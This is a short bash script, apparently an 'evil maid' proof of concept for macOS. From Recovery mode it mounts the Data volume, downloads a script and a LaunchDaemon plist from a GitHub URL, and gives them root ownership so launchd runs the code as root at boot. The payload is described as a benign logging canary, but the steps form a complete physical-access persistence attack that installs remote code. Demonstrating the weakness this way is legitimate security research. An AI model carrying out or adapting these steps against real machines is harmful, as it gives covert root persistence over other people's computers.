#!/bin/bash
# 0. In recovery: connect Wi-Fi from the menu bar first. Utilities > Terminal.

# 1. Find and mount the Data volume
diskutil list
diskutil mount "Data"        # use the exact name from diskutil list
DATA="/Volumes/Data"          # adjust if your name differs

# 2. Confirm it's the real system Data volume before writing anything
ls "$DATA"                                    # expect Library, Users, private, usr, etc.

# 3. Ensure the target dir exists, then pull the benign files
mkdir -p "$DATA/usr/local/bin"
curl -fL -o "$DATA/usr/local/bin/evilmaid_canary.sh" \
  "https://raw.githubusercontent.com/isaacatmann/Canary/refs/heads/main/evilmaid_canary.sh"
curl -fL -o "$DATA/Library/LaunchDaemons/com.poc.evilmaid.canary.plist" \
  "https://raw.githubusercontent.com/isaacatmann/Canary/refs/heads/main/com.poc.evilmaid.canary.plist"

# 4. Ownership + perms (launchd ignores a daemon that isn't root-owned or is writable)
chown 0:0 "$DATA/usr/local/bin/evilmaid_canary.sh"
chmod 755 "$DATA/usr/local/bin/evilmaid_canary.sh"
chown 0:0 "$DATA/Library/LaunchDaemons/com.poc.evilmaid.canary.plist"
chmod 644 "$DATA/Library/LaunchDaemons/com.poc.evilmaid.canary.plist"

# 5. Verify before you reboot
plutil -lint "$DATA/Library/LaunchDaemons/com.poc.evilmaid.canary.plist"
ls -le "$DATA/usr/local/bin/evilmaid_canary.sh" "$DATA/Library/LaunchDaemons/com.poc.evilmaid.canary.plist"

# 6. Exit recovery, boot macOS normally. No launchctl load: launchd auto-loads
#    /Library/LaunchDaemons at boot and RunAtLoad fires.

# 7. After first boot + login:
cat /Library/Logs/EvilMaidPoC/canary.log
